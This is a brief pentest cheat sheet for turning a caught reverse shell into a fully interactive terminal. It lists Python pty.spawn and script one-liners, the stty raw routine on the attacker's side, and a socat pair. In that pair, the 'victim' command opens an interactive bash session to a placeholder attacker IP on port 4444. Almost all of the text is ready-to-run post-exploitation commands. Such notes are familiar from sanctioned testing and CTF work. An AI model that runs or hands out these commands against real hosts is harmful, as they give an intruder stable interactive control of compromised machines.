# Python shell

```bash
#On REV shell
which python
# python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# python2.7
python -c 'import pty; pty.spawn("/bin/bash")'
```

* **On Attacker PC** : -- **Ctrl + Z** -- **Enter** -- **stty raw -echo** in attacking terminal and note down the values for rows and columns.

```bash
stty raw -echo; fg
stty rows NUMBER cols NUMBER
```

# Script shell

```bash
# On REV shell
which script 
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
```

# Socat

```bash
# on Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# on Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:4444
```